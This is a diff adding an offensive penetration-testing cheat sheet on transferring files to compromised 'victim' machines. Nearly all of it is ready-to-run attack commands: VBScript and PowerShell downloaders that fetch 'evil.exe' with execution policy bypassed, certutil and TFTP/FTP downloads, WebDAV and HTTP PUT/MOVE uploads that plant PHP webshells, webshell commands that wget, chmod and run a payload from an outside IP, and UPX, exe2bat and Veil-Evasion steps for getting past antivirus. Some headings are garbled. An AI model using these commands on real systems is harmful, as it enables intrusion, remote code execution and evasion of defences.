@@ -1,0 +1,157 @@
+--------------- Windows File Transfer ---------------
+Netcat:
+     On Victim machine (client):
+         # nc -nlvp 4444 > <[FILE]>
+     On Attacker machine (server):
+         # nc -nv 10.11.17.9 4444 < <[FILE_TO_SEND]>
+Curl:
+     # curl -O http://<[IP]>/<[FILE]>
+
+Wget:
+     # wget http://<[IP]>/<[FILE]>
+
+Recursive wget ftp download:
+     # wget -r ftp://<[USER]>:<[PASSWORD]>@<[DOMAIN]>
+
+--------------- Linux ndows File Transfer ---------------
+
+---------------- TFTP ----------------
+On attacker machine:
+     # mkdir tftp
+     # atftpd --deamon --port 69 tftp
+     # cp <[FILE]> tftp
+On victim machine shell:
+     # tftp -i <[IP]> GET <[FILE]>
+     
+---------------- FTP ----------------
+On Attacker Machine:
+     (UNA TANTUM) Install a ftp server. apt-get install pure-ftpd
+     (UNA TANTUM) Create new user for PureFTPD (see script setup-ftp.sh) (USER demo, PASS demo1234)
+         # groupadd ftgroup
+         # useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+         # pure-pw useradd demo -u ftpuser -d /ftphome
+         # pure-pw mkdb
+         # cd /etc/pure-ftpd/auth
+         # ln -s ../conf/PureDB 60pdb
+         # mkdir -p /ftphome
+         # chown -R ftpuser:ftpgroup /ftphome
+         # /etc/init.d/pure-ftpd restart
+     (UNA TANTUM) chmod 755 setup-ftp.sh   
+
+On Victim Machine Shell:
+     # echo open <[IP]> 21 > ftp.txt
+     # echo USER demo >> ftp.txt
+     # echo ftp >> ftp.txt
+     # echo bin >> ftp.txt
+     # echo GET nc.exe >> ftp.txt
+     # echo bye >> ftp.txt
+     # ftp -v -n -s:ftp.txt
+     
+---------------- VBScript ----------------
+On Victim Machine Sell:
+     # echo strUrl = WScript.Arguments.Item(0) > wget.vbs &
+     # echo StrFile = WScript.Arguments.Item(1) >> wget.vbs &
+     # echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs &
+     # echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs &
+     # echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs &
+     # echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs &
+     # echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs &
+     # echo Err.Clear >> wget.vbs &
+     # echo Set http = Nothing >> wget.vbs &
+     # echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs &
+     # echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs &
+     # echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs &
+     # echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs &
+     # echo http.Open "GET", strURL, False >> wget.vbs &
+     # echo http.Send >> wget.vbs &
+     # echo varByteArray = http.ResponseBody >> wget.vbs &
+     # echo Set http = Nothing >> wget.vbs &
+     # echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs &
+     # echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs &
+     # echo strData = "" >> wget.vbs &
+     # echo strBuffer = "" >> wget.vbs &
+     # echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs &
+     # echo ts.Write Chr(255 And Ascb(Midb(varByteArray, lngCounter +1, 1))) >> wget.vbs &
+     # echo Next >> wget.vbs &
+     # echo ts.Close >> wget.vbs
+         # cscript wget.vbs http://<[IP]>/<[FILE]> <[FILE_NAME]>
+         
+---------------- Powershell ----------------
+On Victim Machine Shell:
+     # echo $storageDir = $pwd > wget.ps1
+     # echo $webclient = New-Object System.Net.WebClient >> wget.ps1
+     # echo $url = "http://<[IP]>/<[FILE]>" >> wget.ps1
+     # echo $file = "evil.exe" >> wget.ps1
+     # echo $webclient.DownloadFile($url,$file) >> wget.ps1
+         # powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+         
+---------------- Debug.exe utility (Windows 32bit OS - File size < 64Kb) ----------------
+On Attacker Machine:
+     # cp <[FILE]> .
+     # upx -9 <[FILE]> (for compression)
+     # cp /usr/share/windows-binaries/exe2bat.exe .
+         # wine exe2bat <[FILE]> <[FILE.txt]>
+         
+---------------- Web Servers ----------------
+Simple Local Web Servers
+Run a basic http server, great for serving up shells etc
+     # python -m SimpleHTTPServer 80
+
+Run a basic Python3 http server, great for serving up shells etc
+     # python3 -m http.server
+
+Run a ruby webrick basic http server
+     # ruby -rwebrick -e "WEBrick::HTTPServer.new (:Port => 80, :DocumentRoot => Dir.pwd).start"
+
+Run a basic PHP http server
+php -S $ip:80        
+
+---------------- Mounting File Shares ----------------
+Mount NFS share to /mnt/nfs
+     # mount $ip:/vol/share /mnt/nfs
+
+---------------- HTTP PUT ----------------
+HTTP Put
+nmap -p80 $ip --script http-put --script-args http-put.url='/test/sicpwn.php',http-put.file='/var/www/html/sicpwn.php
+
+---------------- Uploading Files ----------------
+SCP
+     # scp username1@source_host:directory1/filename1 username2@destination_host:directory2/filename2
+     # scp localfile username@$ip:~/Folder/
+
+Webdav with Davtest- Some sysadmins are kind enough to enable the PUT method - This tool will auto upload a backdoor
+     # davtest -move -sendbd auto -url http://$ip
+     https://github.com/cldrn/davtest
+
+You can also upload a file using the PUT method with the curl command:
+     # curl -T 'leetshellz.txt' 'http://$ip'
+
+And rename it to an executable file using the MOVE method with the curl command:
+     # curl -X MOVE --header 'Destination:http://$ip/leetshellz.php' 'http://$ip/leetshellz.txt'
+
+Upload shell using limited php shell cmd
+use the webshell to download and execute the meterpreter
+     # [curl -s --data "cmd=wget http://174.0.42.42:8000/dhn -O /tmp/evil" http://$ip/files/sh.php
+     # [curl -s --data "cmd=chmod 777 /tmp/evil" http://$ip/files/sh.php
+     # curl -s --data "cmd=bash -c /tmp/evil" http://$ip/files/sh.php
+
+---------------- Packing Files ----------------
+Ultimate Packer for eXecutables
+     # upx -9 nc.exe
+
+exe2bat - Converts EXE to a text file that can be copied and pasted
+     # locate exe2bat
+     # wine exe2bat.exe nc.exe nc.txt
+
+Veil - Evasion Framework - https://github.com/Veil-Framework/Veil-Evasion
+
+
+---------------- certutil.exe ----------------
+certutil.exe -urlcache -split -f http://<ipaddress>/filename
+
+     # apt-get -y install git
+     # git clone https://github.com/Veil-Framework/Veil-Evasion.git
+     # cd Veil-Evasion/
+     # cd setup
+     # setup.sh -c
+
